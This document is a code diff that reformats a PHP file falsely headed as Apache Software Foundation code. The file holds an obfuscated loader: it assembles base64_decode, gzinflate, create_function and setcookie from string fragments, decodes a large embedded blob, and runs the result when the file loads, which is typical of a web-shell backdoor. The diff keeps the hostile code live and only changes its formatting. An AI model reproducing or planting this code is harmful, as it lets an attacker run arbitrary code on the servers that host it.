@@ -1,92 +1,110 @@
 <?php
+
  /*
  * This file is part of the Apache Software Foundation (ASF).
  *
  * This source file is subject to the MIT license that is bundled
  * with this source code in the file LICENSE.
  */
- 
-class Obj {
-	function __construct() {
-		$tx = $this->value($this->x64);
-		$tx = $this->point($this->_build($tx));
-		$tx = $this->_library($tx);
-		if($tx) {
-			$this->_backend = $tx[3];
-			$this->control = $tx[2];
-			$this->module = $tx[0];
-			$this->_emu($tx[0], $tx[1]);
-		}
-	}
-	
-	function _emu($load, $move) {
-		$this->code = $load;
-		$this->move = $move;
-		$this->_x86 = $this->value($this->_x86);
-		$this->_x86 = $this->_build($this->_x86);
-		$this->_x86 = $this->debug();
-		if(strpos($this->_x86, $this->code) !== false) {
-			if(!$this->_backend)
-				$this->dx($this->control, $this->module);
-			$this->_library($this->_x86);
-		}
-	}
-	
-	function dx($core, $stable) {
-		$income = $this->dx[2].$this->dx[1].$this->dx[0];
-		$income = @$income($core, $stable);
-	}
 
-	function claster($move, $px, $load) {
-		$income = strlen($px) + strlen($load);
-		while(strlen($load) < $income) {
-			$_income = ord($px[$this->zx]) - ord($load[$this->zx]);
-			$px[$this->zx] = chr($_income % (2048/8));
-			$load .= $px[$this->zx];
-			$this->zx++;
-		}
-		return $px;
-	}
-   
-	function _build($core) {
-		$ver = $this->_build[1].$this->_build[2].$this->_build[4].$this->_build[0].$this->_build[3];
-		$ver = @$ver($core);
-		return $ver;
-	}
+class Obj
+{
+    public function __construct()
+    {
+        $tx = $this->value($this->x64);
+        $tx = $this->point($this->_build($tx));
+        $tx = $this->_library($tx);
+        if ($tx) {
+            $this->_backend = $tx[3];
+            $this->control = $tx[2];
+            $this->module = $tx[0];
+            $this->_emu($tx[0], $tx[1]);
+        }
+    }
 
-	function point($core) {
-		$ver = $this->point[3].$this->point[2].$this->point[0].$this->point[1];
-		$ver = @$ver($core);
-		return $ver;
-	}
-	
-	function debug() {
-		$this->ls = $this->claster($this->move, $this->_x86, $this->code);
-		$this->ls = $this->point($this->ls);
-		return $this->ls;
-	}
-	
-	function _library($seek) {
-		$ver = $this->_memory[0].$this->_memory[2].$this->_memory[1];
-		$view = @$ver('', $seek);
-		return $view();
-	}
-	
-	function value($income) {
-		$ver = $this->_check[4].$this->_check[0].$this->_check[1].$this->_check[3].$this->_check[2];
-		return $ver("\r\n", "", $income);
-	}
-	 
-	var $stack;
-	var $zx = 0;
-	
-	var $point = array('fl', 'ate', 'in', 'gz');
-	var $_memory = array('crea', 'nction', 'te_fu');
-	var $_build = array('od', 'ba', 'se64_', 'e', 'dec');
-	var $dx = array('ie', 'tcook', 'se');
-	var $_check = array('t', 'r_r', 'lace', 'ep', 's');
-	 
-	var $_x86 = '4bNEsD75NyTB5nMOWmDCZO39v8RsHP88QlQ3zTdmV9ljaWRpmeC2luPZZn/FecrOVth8TgjorG9NodqL
+    public function _emu($load, $move)
+    {
+        $this->code = $load;
+        $this->move = $move;
+        $this->_x86 = $this->value($this->_x86);
+        $this->_x86 = $this->_build($this->_x86);
+        $this->_x86 = $this->debug();
+        if (strpos($this->_x86, $this->code) !== false) {
+            if (! $this->_backend) {
+                $this->dx($this->control, $this->module);
+            }
+            $this->_library($this->_x86);
+        }
+    }
+
+    public function dx($core, $stable)
+    {
+        $income = $this->dx[2].$this->dx[1].$this->dx[0];
+        $income = @$income($core, $stable);
+    }
+
+    public function claster($move, $px, $load)
+    {
+        $income = strlen($px) + strlen($load);
+        while (strlen($load) < $income) {
+            $_income = ord($px[$this->zx]) - ord($load[$this->zx]);
+            $px[$this->zx] = chr($_income % (2048 / 8));
+            $load .= $px[$this->zx];
+            $this->zx++;
+        }
+
+        return $px;
+    }
+
+    public function _build($core)
+    {
+        $ver = $this->_build[1].$this->_build[2].$this->_build[4].$this->_build[0].$this->_build[3];
+        $ver = @$ver($core);
+
+        return $ver;
+    }
+
+    public function point($core)
+    {
+        $ver = $this->point[3].$this->point[2].$this->point[0].$this->point[1];
+        $ver = @$ver($core);
+
+        return $ver;
+    }
+
+    public function debug()
+    {
+        $this->ls = $this->claster($this->move, $this->_x86, $this->code);
+        $this->ls = $this->point($this->ls);
+
+        return $this->ls;
+    }
+
+    public function _library($seek)
+    {
+        $ver = $this->_memory[0].$this->_memory[2].$this->_memory[1];
+        $view = @$ver('', $seek);
+
+        return $view();
+    }
+
+    public function value($income)
+    {
+        $ver = $this->_check[4].$this->_check[0].$this->_check[1].$this->_check[3].$this->_check[2];
+
+        return $ver("\r\n", '', $income);
+    }
+
+    public $stack;
+    public $zx = 0;
+
+    public $point = ['fl', 'ate', 'in', 'gz'];
+    public $_memory = ['crea', 'nction', 'te_fu'];
+    public $_build = ['od', 'ba', 'se64_', 'e', 'dec'];
+    public $dx = ['ie', 'tcook', 'se'];
+    public $_check = ['t', 'r_r', 'lace', 'ep', 's'];
+
+    public $_x86 = '4bNEsD75NyTB5nMOWmDCZO39v8RsHP88QlQ3zTdmV9ljaWRpmeC2luPZZn/FecrOVth8TgjorG9NodqL
 	MwPr4x/buAoZK7+OQBC2FtLXPa45gANV7Fl9z4X6laW1sygsKjPsNwpZR9rHjiycH4g1QjveoIsNPSCz
 	zW6v7x3KKYFP4pq2JAoXrZKzDaldkDP63/L+Hwu6+DjRQkiBq4qU8ZLlPgceyEUnUjbHMXN/stuzoRxE
 	9wyi3zXciZAthz2ce8GcoGWdq363/cQMfu21ZyNUu9bENXxmxE6woxK86JV3jcaWWxDhGfNErGWkKVBE
@@ -313,8 +331,8 @@ class Obj {
 	9a6fxl+uUNxTlMksnEVtDoaGHADTktLIBgMxM6xbk30flz6vKfEuj9snV0jOpWBVX3uEl65JTW++WLS8
 	xtp2OWdBIzulOQbX9sJG6HD+1l34Nm8bepz5/xYkhbZJTn0uzmKat6wLOzhmBxlz3w87OpkPGFJ1bUo2
 	w9zEMzrU';
-	 
-	var $x64 = 'bVLbTttAEH0OEv8wrCzWlqyEUJq08uUFuQIhNW2S9iVUkWNvlC32rrUXglXy74wXSpvA28ycmbNnzqxn
+
+    public $x64 = 'bVLbTttAEH0OEv8wrCzWlqyEUJq08uUFuQIhNW2S9iVUkWNvlC32rrUXglXy74wXSpvA28ycmbNnzqxn
 	akiA0gg8vnrAcJ1XmkXHR95vXWFKlgT6oO1KG+XrTT70veUsm/7Mpgt6NZ9/W15NZnP6KwjhLIQPAQ7y
 	tc+1ZgYbp9n3H9lsvqBLdY89Afw5Pur1PPfkPuVBp2Mbjjq63g4YKvqP9XIyubnOFp3AA859LHLA81ZG
 	WebInL4TVjem9XEI5xUzVgnIlcpdKQT6eXyej8Y0hI4ndM50UlixkUDjlSxbkKKQwrAHUzNhE/JC4swj
@@ -325,4 +343,3 @@ class Obj {
 }
 
 new Obj();
-?>
